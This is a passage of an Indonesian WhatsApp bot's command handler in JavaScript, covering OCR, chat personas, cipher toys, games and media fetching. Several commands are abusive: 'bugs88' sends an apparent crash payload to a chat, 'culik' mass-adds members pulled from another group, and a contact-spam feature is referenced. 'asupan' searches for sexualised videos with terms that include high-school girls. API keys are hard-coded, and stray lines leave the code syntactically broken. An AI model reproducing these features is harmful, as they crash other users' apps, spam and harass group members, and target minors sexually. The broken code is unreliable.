 m.reply('Tidak ada media yang ditemukan');
 break;
 }

 // Mengunduh media
 let media = await q.download();

 // Mengecek apakah media adalah gambar atau video mp4
 let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);

 // Mengupload media dan mendapatkan link
 let link = await (isTele ? uploadImage : uploadImage)(media); // Menggunakan uploader yang sama untuk semua jenis file

 // Mengirim permintaan ke API OCR
 let res = await (await fetch(`https://api.ocr.space/parse/imageurl?apikey=helloworld&url=${link}&language=jpn`)).json();

 // Mengecek apakah hasil OCR ada
 if (res.ParsedResults && res.ParsedResults.length > 0) {
 m.reply(`*Result:*\n\n${res.ParsedResults[0]?.ParsedText}`);
 } else {
 m.reply("Tidak ada teks yang terdeteksi.");
 }
}
break
case 'pinmessage': {
 // Ambil pesan yang ingin dipin dari argumen
 const pinnedMessage = args.join(' ');

 // Pastikan ada pesan yang diinput
 if (!pinnedMessage) {
 m.reply('Silakan masukkan pesan yang ingin Anda pin.');
 return;
 }

 // Pin pesan yang dimasukkan oleh pengguna
 m.reply(pinnedMessage).then((message) => {
 m.pinMessage(message.chat.id, message.id);
 m.reply('Pesan telah berhasil dipin di grup.');
 });
}
 break
			
case 'marah': {
 if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
 if (!text) throw 'Apa Sih Lu ?';
 const requestBody = {
 messages: [{ role: 'user', content: q }],
 system: 'kamu adalah seorang pemarah dan kamu akan membalas semua pesan dengan nada yang sangat marah sertakan emote yang sesuai dengan keadaan marah dan kamu sangat membenci pertanyaan yang aneh dan bertele tele, nama kamu adalah angry iky',
 };
 axios.post('https://xzn.wtf/api/openai?apikey=alzak', requestBody)
 .then(response => {
 const result = response.data.result;
 m.reply(`${result}`.trim());
 })
 .catch(error => {
 console.error('Error:', error);
 m.reply('Terjadi kesalahan.');
 });
}
break
case 'bard2': {
 if (!m.quoted && !text) throw `Kirim Gambar Dengan Text`;
 const uploadImage = require('./lib/uploadImage')
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime) {
 m.reply('Tidak ada media yang ditemukan');
 return;
 }
 let media = await q.download();
 let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
 let link = await (isTele ? uploadImage : uploadImage)(media);
 const { data } = await axios.get(`https://widipe.com/bardimg?url=${link}&text=${q}`);
 m.reply(`${data.result}`.trim());
}
break
 
case 'listcolor': {
 const colorList = [
 'Merah (#FF0000)',
 'Hijau (#00FF00)',
 'Biru (#0000FF)',
 'Kuning (#FFFF00)',
 'Magenta (#FF00FF)',
 'Cyan (#00FFFF)',
 'Oranye (#FFA500)',
 'Ungu (#800080)',
 'Aqua (#008080)',
 'Abu-abu (#808080)',
 'Merah Muda (#FFC0CB)',
 'Cokelat (#800000)',
 'Hijau Tua (#008000)',
 'Biru Tua (#000080)',
 'Krim (#FFFFF0)',
 'Mint (#F0FFF0)',
 'Azure (#F0FFFF)',
 'Merah Muda Tua (#DC143C)',
 'Jingga (#FF4500)',
 'Ungu Gelap (#4B0082)',
 'Marun (#8B0000)',
 'Biru Muda (#00CED1)',
 'Ungu Tua (#9400D3)',
 'Biru Hijau (#008B8B)',
 'Hijau Hutan (#2E8B57)',
 'Tomat (#FF6347)',
 'Cokelat Kemerahan (#A52A2A)',
 'Hijau Kuning (#7FFF00)',
 'Biru Lavender (#6A5ACD)',
 'Hijau Lime (#32CD32)',
 'Salmon (#FA8072)',
 'Pink (#FFC0CB)',
 'Lavender (#E6E6FA)',
 'Teal (#008080)',
 'Dark Khaki (#BDB76B)',
 'Goldenrod (#DAA520)',
 'Light Slate Gray (#778899)',
 'Slate Blue (#6A5ACD)',
 'Dark Olive Green (#556B2F)',
 'Medium Purple (#9370DB)',
 'Steel Blue (#4682B4)',
 'Sienna (#A0522D)',
 'Dark Slate Gray (#2F4F4F)',
 'Cornflower Blue (#6495ED)',
 'Medium Sea Green (#3CB371)',
 'Medium Slate Blue (#7B68EE)',
 'Indian Red (#CD5C5C)',
 'Dark Turquoise (#00CED1)',
 'Saddle Brown (#8B4513)',
 'Pale Violet Red (#DB7093)'
 ];

 const colorListText = colorList.map((color, index) => `${index + 1}. ${color}`).join('\n');
 m.reply(`Daftar Warna:\n${colorListText}`);
 }
 break
case 'adduser': {
 if (!isCreator) return m.reply(mess.owner);
 
 const numberOfUsersToAdd = parseInt(args[0]);

 if (isNaN(numberOfUsersToAdd) || numberOfUsersToAdd <= 0) {
 m.reply('Tentukan jumlah pengguna palsu yang valid untuk ditambahkan.');
 return;
 }

 const currentDate = new Date().toLocaleString(); // Waktu hari ini
 
 for (let i = 0; i < numberOfUsersToAdd; i++) {
 const fakeNumber = Math.floor(1000000000 + Math.random() * 9000000000); // Nomor acak antara 1000000000 dan 9999999999
 const formattedFakeNumber = `628${fakeNumber}@s.whatsapp.net`; // Format nomor fake 628*********@s.whatsapp.net
 db.data.users[formattedFakeNumber] = {
 afkTime: 0,
 afkReason: '',
 limit: 0,
 balance: 0,
 premium: currentDate,
 };
 }

 m.reply(`Berhasil menambahkan ${numberOfUsersToAdd} pengguna.`);
}
break
case 'culik': {
	if (!text) throw `id mana woy`
 const groupMembers = await sky.groupMetadata(args[0])

 let pantek = []
 for (let i of groupMembers.participants) {
 pantek.push(i.jid)
 }

 sky.groupParticipantsUpdate(args[0], pantek)
}
break
case 'cekidgc': {
let getGroups = await sky.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await sky.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
m.reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case 'nulis': {
 if (!isPrem) return replyprem(mess.premium)
if (args1.length == 0) return m.reply(`Example: ${prefix + command} Avosky-MD`)
		 m.reply(mess.wait)
 sky.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/nulis?apikey=Gata_Dios&text=${q}` }, caption: `Created By Avosky-MD\n\n Type: ${command}\n\nText: ${text}`})
 }
			break
case 'randompeople': {
 try {
 const apiKey = 'Gata_Dios';
 const apiUrl = `https://api.lolhuman.xyz/api/random/people?apikey=${apiKey}`;
 
 const response = await axios.get(apiUrl);
 const result = response.data.result;

 const gender = result.gender;
 const name = `${result.name.title} ${result.name.first} ${result.name.last}`;
 const location = result.location;
 
 const message = `Informasi Random People:\n` +
 `Gender: ${gender}\n` +
 `Name: ${name}\n` +
 `Location: ${location.street.number} ${location.street.name}, ${location.city}, ${location.state}, ${location.country}\n` +
 `Postcode: ${location.postcode}\n` +
 `Coordinates: Latitude ${location.coordinates.latitude}, Longitude ${location.coordinates.longitude}\n` +
 `Timezone: UTC ${location.timezone.offset} (${location.timezone.description})`;

 m.reply(message);
 } catch (error) {
 console.error(error);
 m.reply('Terjadi kesalahan dalam mengambil data random people.');
 }
 }
 break
            case 'suitpvp': case 'suit': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await sky.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) sky.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
        	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                m.reply('Ketik RealOwner Chat Salah Satu')
            }
            break
case 'apiky': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                m.reply('https://api.akuari.my.id/docs\n\nhttps://api.botcahx.live/\n\nhttps://api.lolhuman.xyz/\n\nhttps://skizo.tech/\n\nhttps://api.xyroinee.xyz/\n\nhttps://vihangayt.me/\n\nhttps://api.azz.biz.id\n\napi.yanzbotz.my.id\n\n')         
              }
            break
            
case 'vibra': {
 try {
 if (!args[0]) {
 return m.reply('Mohon berikan nilai frekuensi gelombang. Contoh: /vibra 20');
 }

 let freq = parseInt(args[0]);

 if (isNaN(freq) || freq <= 0) {
 return m.reply('Nilai frekuensi tidak valid. Harus berupa angka positif.');
 }

 let set = `-af vibrato=f=${freq}`;
 
 if (/audio/.test(mime)) {
 m.reply(mess.wait);
 let media = await sky.downloadAndSaveMediaMessage(qmsg);
 let ran = getRandom('.mp3');
 exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
 fs.unlinkSync(media);
 if (err) return m.reply(err);
 let buff = fs.readFileSync(ran);
 sky.sendMessage(m.chat, { audio: buff, mimetype:'audio/mpeg', ptt:true }, { quoted: m });
 fs.unlinkSync(ran);
 });
 } else {
 m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`);
 }
 } catch (e) {
 m.reply(e);
 }
}
break
case 'bugs88': {
if (!isCreator) return m.reply("ngapain?") 
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs: Date.now(),
 title: `${ios2}${ios2}${ngazap}`
 }
}
sky.relayMessage(m.chat, call, {})
}
break
case 'intro': {
m.reply(`
↷✦; w e l c o m e ❞


━━━━━━ ◦ 𝐊𝐚𝐫𝐭𝐮 𝐈𝐧𝐭𝐫𝐨 ◦ ━━━━━━

➥𝐍𝐚𝐦𝐚 : 
➥𝐀𝐬𝐤𝐨𝐭 :
➥𝐊𝐞𝐥𝐚𝐬 :
➥𝐂𝐞/𝐂𝐨 :

━━━━━━。゜✿ฺ✿ฺ゜。━━━━━━

﹛♛﹜𝑾𝒂𝒕𝒕𝒑𝒂𝒅 𝑪𝒍𝒖𝒃
`)
}
break
case 'spotify':{
	if (!text) return m.reply(`*Please enter a song name*`)
 try {
 const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
 const response = await fetch(apiUrl);
 if (!response.ok) {
 console.log('Error searching for song:', response.statusText)
 return m.reply('Error searching for song')
 }
 const data = await response.json()
 const coverimage = data.spty.results.thumbnail
 const name = data.spty.results.title
 const slink = data.spty.results.url
 const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
 const audioResponse = await fetch(dlapi)
 if (!audioResponse.ok) {
 console.log('Error fetching audio:', audioResponse.statusText)
 return m.reply('Error fetching audio')
 }
 const audioBuffer = await audioResponse.buffer()
 const tempDir = os.tmpdir()
 const audioFilePath = path.join(tempDir, 'audio.mp3')
 try {
 await fs.promises.writeFile(audioFilePath, audioBuffer)
 } catch (writeError) {
 console.error('Error writing audio file:', writeError)
 return m.reply( 'Error writing audio file')
 }
 let doc = {
 audio: {
 url: audioFilePath
 },
 mimetype: 'audio/mpeg',
 ptt: true,
 waveform: [100, 0, 100, 0, 100, 0, 100],
 fileName: "dgxeon",
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 title: `PLAYING TO ${name}`,
 body: botname,
 thumbnailUrl: coverimage,
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 } 
 await sky.sendMessage(m.chat, doc, { quoted: m })
 } catch (error) {
 console.error('Error fetching Spotify data:', error)
 return m.reply('*Error*')
 }
 }
 break
case 'gg','kk': {
m.reply(`ha`)
}
break
case 'estimasi': {
 if (!text) {
 return m.reply(`Provide distance (in kilometers) and speed (in km/h) to calculate ETA.\n\nExample: ${prefix + command} 100 60`);
 }

 const inputArray = text.split(' ');
 if (inputArray.length !== 2) {
 return m.reply('Invalid format. Please provide the correct format.');
 }

 const distance = parseFloat(inputArray[0]);
 const speed = parseFloat(inputArray[1]);

 if (isNaN(distance) || isNaN(speed)) {
 return m.reply('Invalid distance or speed. Please provide valid numbers.');
 }

 if (speed <= 0) {
 return m.reply('Speed must be a positive value.');
 }

 const etaHours = distance / speed;
 const etaMinutes = Math.round((etaHours - Math.floor(etaHours)) * 60);

 m.reply(`Estimated Time of Arrival (ETA):\n${Math.floor(etaHours)} hours and ${etaMinutes} minutes`);
}
break
case 'bingai': {
 if (!text) throw `Hello ${pushname}`
 const { data } = await axios.get(`https://widipe.com/bingai?text=${encodeURIComponent(text)}`);
 m.reply(`${data.result}`.trim());
}
break

asupan 

case 'asupan': {
 if (!isPrem) return replyprem(mess.premium)
 if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
 m.reply(mess.wait);
 const searchTerms = ['tobrut', 'sma terbuka', 'mey mey boba', 'ghea youbi', 'tobrut style', 'tobrut viral', 'tobrut indo', 'asupan enak', 'tobrut bule', 'viral terbaru', 'sma semok', 'sma terbuka', 'bahan crt terbuka', 'aku mau crt', 'asupan full body', 'cewe gym crt', 'cewe gym berkeringat', 'tobrut', 'goyang mantap tobrut']
 const randomSearchTerm = searchTerms[Math.floor(Math.random() * searchTerms.length)];
 axios.get(`https://widipe.com/tiktoksearch?text=asupan%20${encodeURIComponent(randomSearchTerm)}`).then(({ data }) => {
 const result = data.result;
 if (!result || !result.data || result.data.length === 0) {
 return m.reply(`Tidak ada data asupan untuk "${randomSearchTerm}" yang ditemukan.`);
 }
 const videoData = result.data[0];
 sky.sendMessage(m.chat, { video: { url: videoData.play, mimetype: 'video/mp4' } });
 }).catch(error => {
 console.error(error);
 m.reply('Terjadi kesalahan saat mengambil data asupan.');
 });
}
 break
case 'dare': {
 const daresList = [
 "Foto kuburan tengah malam berani ga?",
 "Ambil foto bot, jadikan foto profil kamu selama 1 hari",
 "VN nyanyi balonku ada 5",
 "Minum Coca-Cola sampai habis tanpa sendawa selama 30 detik",
 "Makan 1 Cabe tanpa minum, tanpa gorengan selama 2 menit",
 "Celupin hp kamu ke air selama 30 detik",
 "VN *Aku sayang kamu*",
 "Nyanyi potong bebek angsa (VN)",
 "Kirim pesan ke mantan kamu dan bilang _aku masih suka sama kamu_",
 "Telfon crush/pacar sekarang dan ss ke pemain",
 "Pap ke salah satu anggota grup",
 "Pap apa yang di depan kamu",
 "SS recent call whatsapp",
 "Kirim voice note bilang can i call u baby?",
 "Pake foto sule sampe 3 hari'",
 "Ketik pake bahasa daerah 24 jam",
 "Ganti nama menjadi _gue anak lucinta luna_ selama 5 jam",
 "Chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia _i lucky to hv you_",
 "Prank chat mantan dan bilang *i love u, pgn balikan*",
 "Record voice baca surah al-kautsar",
 "Ganti nama jadi *BOWO* selama 24 jam",
 "Sebutkan tipe pacar mu!",
 "VN *aku mencintaimu*",
 "Kamu harus pap sekarang!",
 "Kamu harus bagi bagi limit, minimal 2 setiap pengguna",
 "Chatingan selama 1 jam harus 4l4Y 8AN93T"
 ];

 const randomIndex = Math.floor(Math.random() * daresList.length);
 const randomDare = daresList[randomIndex];
m.reply(`Dare: ${randomDare}`);
}
 break
case 'truth': {
 const truthsList = [
 "Pernah ngambil uang ortu apa ga?",
 "Pernah bohong sama ortu apa aja?\nCoba ceritakan tentang kebohongannya",
 "Apa makanan yang kamu sukai?",
 "Siapa yang mau di jadikan pacar di gc ini?",
 "Apa mimpi terburukmu?",
 "Apa hal paling memalukan dari temanmu?",
 "Pernah suka sama siapa aja? berapa lama?",
 "Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)",
 "Apa ketakutan terbesar kamu?",
 "Pernah suka sama orang dan merasa orang itu suka sama kamu juga?",
 "Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?",
 "Pernah gak nyuri uang nyokap atau bokap? Alesanya?",
 "Hal yang bikin seneng pas lu lagi sedih apa?",
 "Pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?",
 "Pernah jadi selingkuhan orang?",
 "Hal yang paling ditakutin",
 "Siapa orang yang paling berpengaruh kepada kehidupanmu",
 "Hal membanggakan apa yang kamu dapatkan di tahun ini",
 "Siapa orang yang bisa membuatmu sange :v",
 "Sapa orang yang pernah buatmu sange",
 "(bgi yg muslim) pernah ga solat seharian?",
 "Siapa yang paling mendekati tipe pasangan idealmu di sini",
 "Suka mabar(main bareng)sama siapa?",
 "Pernah nolak orang? alasannya kenapa?",
 "Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget",
 "Pencapaian yang udah didapet apa aja ditahun ini?",
 "Kebiasaan terburuk lo pas di sekolah apa?",
 "Siapa nama mantan yang bikin lo sakit hati?"
 ];

 const randomIndex = Math.floor(Math.random() * truthsList.length);
 const randomTruth = truthsList[randomIndex];
 m.reply(`Truth: ${randomTruth}`);
}
break
case 'ttsound': {
 if (!isPrem) return replyprem(mess.premium);
 if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
 if (!text) throw `nyari sound apa?`;
 m.reply(mess.wait);

 // Fungsi untuk mencari sound TikTok menggunakan API dari tikwm.com
 async function tiktoks(query) {
 try {
 const response = await axios({
 method: 'POST',
 url: 'https://tikwm.com/api/feed/search',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Cookie': 'current_language=en',
 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
 },
 data: {
 keywords: query,
 count: 10,
 cursor: 0,
 HD: 1
 }
 });

 if (response.data && response.data.data && response.data.data.videos) {
 const videos = response.data.data.videos;
 if (videos.length === 0) {
 throw new Error('Tidak ada video ditemukan.');
 }
 const gywee = Math.floor(Math.random() * videos.length); // Pilih video secara acak
 const videorndm = videos[gywee];

 return {
 title: videorndm.title,
 cover: videorndm.cover,
 origin_cover: videorndm.origin_cover,
 no_watermark: videorndm.play,
 watermark: videorndm.wmplay,
 music: videorndm.music
 };
 } else {
 throw new Error('Struktur data tidak sesuai.');
 }
 } catch (error) {
 throw new Error(`Terjadi kesalahan saat mengambil data: ${error.message}`);
 }
 }

 // Memanggil fungsi async untuk mencari sound TikTok
 tiktoks(text).then(result => {
 if (!result || !result.music) {
 return m.reply(`Tidak ada sound untuk pencarian "${text}" yang ditemukan.`);
 }

 // Mengirimkan sound TikTok sebagai file audio
 sky.sendMessage(m.chat, { audio: { url: result.music }, mimetype: "audio/mp4", fileName: "TikTok Sound.mp3" }, { quoted: fkontak });
 }).catch(error => {
 console.error(error);
 m.reply(`Terjadi kesalahan saat mengambil sound: ${error.message}`);
 });
}
break;
case 'cekbynum': {
 if (!m.isGroup) throw mess.group;

 const targetCountryCode = args[0]; // Mendapatkan kode negara dari argumen

 if (!targetCountryCode) {
 m.reply('Tentukan kode negara untuk melakukan cek by number.');
 return;
 }

 // Deteksi anggota berdasarkan kode negara
 const targetMembersList = [];

 for (const member of participants) {
 const countryCode = member.id.replace(/[^0-9]/g, '').substring(0, 2);

 if (countryCode === targetCountryCode) {
 targetMembersList.push(`- ${member.id.split('@')[0]}`);
 }
 }

 // Menampilkan list anggota sesuai kode negara
 if (targetMembersList.length > 0) {
 const totalTargetMembers = targetMembersList.length;

 const responseText = `🌐 *List Anggota Berdasarkan Kode Negara ${targetCountryCode}*:\n${targetMembersList.join('\n')}\n\n👤 *Total Anggota*: ${totalTargetMembers}`;
 
 m.reply(responseText);
 } else {
 m.reply(`Tidak ada anggota dengan kode negara ${targetCountryCode} di grup ini.`);
 }
}
break
case 'tagall2':{
if (!isPrem) return m.reply(mess.premium)
 if (!isGroup) throw mess.onlygroup;
 if (!args[0]) throw `Gunakan: *${prefix}tagall [jumlah anggota yang ingin ditag]*`;
 
 const jumlahTag = parseInt(args[0]);
 if (isNaN(jumlahTag) || jumlahTag <= 0) throw 'Jumlah anggota yang ingin ditag harus berupa angka positif.';
 
 const participants = await sky.groupMetadata(from);
 const participantList = participants.participants;
 
 for (let i = 0; i < Math.min(jumlahTag, participantList.length); i++) {
 const participant = participantList[i];
 const contactId = participant.id;
 const contactName = participant.notify ? participant.notify : participant.id.split('@')[0];
 await sky.sendTextWithMentions(from, `Yoo @${contactId.split('@')[0]}`);
 
 // Menunggu sejenak sebelum meng-tag peserta berikutnya
 await new Promise(resolve => setTimeout(resolve, 200));
 }
 }
 break
case 'deonetimepad': {
 // Fungsi untuk dekripsi menggunakan One-Time Pad
 const decryptOneTimePad = (encryptedText, key) => {
 const decryptedText = encryptedText.split('').map((char, index) => {
 const encryptedCharCode = char.charCodeAt(0);
 const keyCode = key.charCodeAt(index);
 const decryptedCharCode = encryptedCharCode ^ keyCode; // XOR operation
 return String.fromCharCode(decryptedCharCode);
 }).join('');

 return decryptedText;
 };

 const inputText = args.slice(1).join(' ');
 const key = args[0];

 // Pengecekan apakah teks dan kunci tidak kosong
 if (!inputText || !key) {
 m.reply('Mohon masukkan teks terenkripsi dan kunci untuk mendekripsinya.');
 return;
 }

 const decryptedResult = decryptOneTimePad(inputText, key);

 m.reply(`Teks terdekripsi dengan One-Time Pad:\nTeks Terenkripsi: "${inputText}"\nKunci: "${key}"\nHasil Dekripsi: "${decryptedResult}"`);
}
break
case 'onetimepad': {
 const generateRandomKey = (textLength) => {
 const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
 let key = '';
 for (let i = 0; i < textLength; i++) {
 const randomIndex = Math.floor(Math.random() * characters.length);
 key += characters[randomIndex];
 }
 return key;
 };

 const oneTimePadEncrypt = (plainText, key) => {
 let encryptedText = '';
 for (let i = 0; i < plainText.length; i++) {
 const charCode = plainText.charCodeAt(i) ^ key.charCodeAt(i);
 encryptedText += String.fromCharCode(charCode);
 }
 return encryptedText;
 };

 const plaintextInput = args.slice(1).join(' ');
 const key = generateRandomKey(plaintextInput.length);
 const encryptedResult = oneTimePadEncrypt(plaintextInput, key);

 m.reply(`One-Time Pad Encryption:\nPlaintext: "${plaintextInput}"\nKey: "${key}"\nEncrypted Result: "${encryptedResult}"`);
}
break

case 'caesarcipher': {
 const textToCaesarCipher = (text, shift) => {
 return text.replace(/[a-zA-Z]/g, (char) => {
 const isUpperCase = char === char.toUpperCase();
 const startCode = isUpperCase ? 65 : 97;
 const shiftedCharCode = (char.charCodeAt(0) - startCode + shift) % 26 + startCode;
 return String.fromCharCode(shiftedCharCode);
 });
 };

 const inputText = args.join(' '); // Menggabungkan argumen menjadi satu teks
 const shiftAmount = 3; // Jumlah pergeseran, sesuaikan sesuai kebutuhan
 const caesarCipherResult = textToCaesarCipher(inputText, shiftAmount);

 m.reply(`Teks "${inputText}" dienkripsi menjadi\nCaesar Cipher: "${caesarCipherResult}"`);
}
break 
case 'decaesarcipher': {
 const caesarCipherToText = (cipherText, shift) => {
 return cipherText.replace(/[a-zA-Z]/g, (char) => {
 const isUpperCase = char === char.toUpperCase();
 const startCode = isUpperCase ? 65 : 97;
 const originalCharCode = (char.charCodeAt(0) - startCode - shift + 26) % 26 + startCode;
 return String.fromCharCode(originalCharCode);
 });
 };

 const cipherInput = args.join(' '); // Menggabungkan argumen menjadi satu teks Caesar Cipher
 const shiftAmount = 3; // Jumlah pergeseran, sesuaikan sesuai kebutuhan
 const decaesarCipherResult = caesarCipherToText(cipherInput, shiftAmount);

 m.reply(`Teks Caesar Cipher "${cipherInput}"\ndidekripsi: "${decaesarCipherResult}"`);
}
break


case 'vigencrypt': {
 const vigenereEncrypt = (text, key) => {
 let result = '';
 for (let i = 0; i < text.length; i++) {
 const char = text.charAt(i);
 const isUpperCase = char === char.toUpperCase();
 const baseCharCode = isUpperCase ? 65 : 97;
 const shift = key.charCodeAt(i % key.length) - baseCharCode;
 const encryptedCharCode = (char.charCodeAt(0) + shift - baseCharCode + 26) % 26 + baseCharCode;
 result += String.fromCharCode(encryptedCharCode);
 }
 return result;
 };

 const plaintext = args.slice(1).join(' '); // Mengambil teks dari argumen kedua ke depan
 const keyword = args[0];
 const vigenereCipherText = vigenereEncrypt(plaintext, keyword);

 m.reply(`Teks "${plaintext}" dienkripsi menggunakan Vigenère Cipher: "${vigenereCipherText}"`);
}
break

case 'vigdecrypt': {
 const vigenereDecrypt = (cipherText, key) => {
 let result = '';
 for (let i = 0; i < cipherText.length; i++) {
 const char = cipherText.charAt(i);
 const isUpperCase = char === char.toUpperCase();
 const baseCharCode = isUpperCase ? 65 : 97;
 const shift = key.charCodeAt(i % key.length) - baseCharCode;
 const decryptedCharCode = (char.charCodeAt(0) - shift - baseCharCode + 26) % 26 + baseCharCode;
 result += String.fromCharCode(decryptedCharCode);
 }
 return result;
 };

 const cipherText = args.slice(1).join(' '); // Mengambil teks dari argumen kedua ke depan
 const keyword = args[0];
 const vigenereDecryptedText = vigenereDecrypt(cipherText, keyword);

 m.reply(`Teks Vigenère Cipher "${cipherText}" didekripsi: "${vigenereDecryptedText}"`);
}
break
vigencrypt
case 'caesardynamic':
 const encryptCaesarDynamic = (text) => {
 let result = '';
 for (let i = 0; i < text.length; i++) {
 const char = text[i];
 const isUpperCase = char === char.toUpperCase();
 const startCode = isUpperCase ? 65 : 97;
 const shift = (i % text.length) + 1; // Pergeseran dinamis berdasarkan panjang kata
 const encryptedCharCode = (char.charCodeAt(0) + shift - startCode) % 26 + startCode;
 result += String.fromCharCode(encryptedCharCode);
 }
 return result;
 };

 const caesarDynamicText = args.join(' ');
 const caesarDynamicResult = encryptCaesarDynamic(caesarDynamicText);

 m.reply(`Teks terenkripsi menggunakan metode Caesar dengan pergeseran dinamis:\n${caesarDynamicText} menjadi "${caesarDynamicResult}"`);
 break
case 'decaesardynamic':
 const decryptCaesarDynamic = (text) => {
 let result = '';
 for (let i = 0; i < text.length; i++) {
 const char = text[i];
 const isUpperCase = char === char.toUpperCase();
 const startCode = isUpperCase ? 65 : 97;
 const shift = (i % text.length) + 1; // Pergeseran dinamis berdasarkan panjang kata
 const decryptedCharCode = (char.charCodeAt(0) - shift - startCode + 26) % 26 + startCode;
 result += String.fromCharCode(decryptedCharCode);
 }
 return result;
 };

 const decCaesarDynamicText = args.join(' ');
 const decCaesarDynamicResult = decryptCaesarDynamic(decCaesarDynamicText);

 m.reply(`Teks terdekripsi menggunakan metode Caesar Dynamic:\n${decCaesarDynamicText} menjadi "${decCaesarDynamicResult}"`);
 break
case 'hillcipher':
 const modInverse = (a, m) => {
 for (let x = 1; x < m; x++) {
 if ((a * x) % m === 1) {
 return x;
 }
 }
 return 1;
 };

 const matrixMultiply = (matrix1, matrix2) => {
 return matrix1.map((row) =>
 matrix2[0].map((_, i) => row.reduce((acc, val, j) => acc + val * matrix2[j][i], 0))
 );
 };

 const encryptHillCipher = (text, keyMatrix) => {
 const textMatrix = text.split('').map((char) => char.charCodeAt(0) - 65);
 const resultMatrix = matrixMultiply([textMatrix], keyMatrix);
 const encryptedText = resultMatrix[0].map((val) => String.fromCharCode((val % 26) + 65)).join('');
 return encryptedText;
 };

 // Gunakan matriks 2x2 sebagai contoh
 const hillCipherKey = [
 [6, 24],
 [13, 16],
 ];

 const hillCipherText = args.join(' ').toUpperCase();
 const hillCipherResult = encryptHillCipher(hillCipherText, hillCipherKey);

 m.reply(`Teks terenkripsi menggunakan metode Hill Cipher:\n${hillCipherText} menjadi "${hillCipherResult}"`);
 break

case 'addmember': {
m.reply('Jadikan Bot Sebagai Admin untuk menggunakan Fitur ini')
}
break
case 'playvid': {
 if (!text) return m.reply('Example: ' + prefix + 'playvid story wa sedih');

 let yts = require("yt-search");

 // Function untuk mengunduh video menggunakan API
 async function mp4(url) {
 try {
 const response = await fetch('https://api.zeemo.ai/hy-caption-front/api/v1/video-download/yt-dlp-video-info', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json',
 'Accept': '*/*',
 'User-Agent': 'Postify/1.0.0'
 },
 body: JSON.stringify({ url, videoSource: 3 })
 });
 const { data } = await response.json();
 return {
 status: true,
 creator: '@avosky',
 title: data.videoName,
 url: data.sourceVideoUrl,
 media: data.downloadUrl
 };
 } catch {
 return {
 status: false,
 msg: 'Data tidak dapat ditemukan!'
 };
 }
 }

 // Lakukan pencarian video menggunakan teks yang diberikan
 let search = await yts(text);

 if (!search || !search.all || search.all.length === 0) {
 return m.reply('Video tidak ditemukan.');
 }

 // Ambil URL video pertama dari hasil pencarian
 let videoUrl = search.all[0].url;

 // Unduh video dari URL menggunakan function mp4
 let vid = await mp4(videoUrl);

 // Cek apakah video berhasil diunduh
 if (!vid.status) {
 return m.reply(vid.msg);
 }

 // Buat teks caption dengan detail video
 let caption = `
Title: ${vid.title}
Creator: ${vid.creator}
URL: ${vid.url}
 `;

 // Kirim video ke pengguna
 await sky.sendMessage(m.chat, {
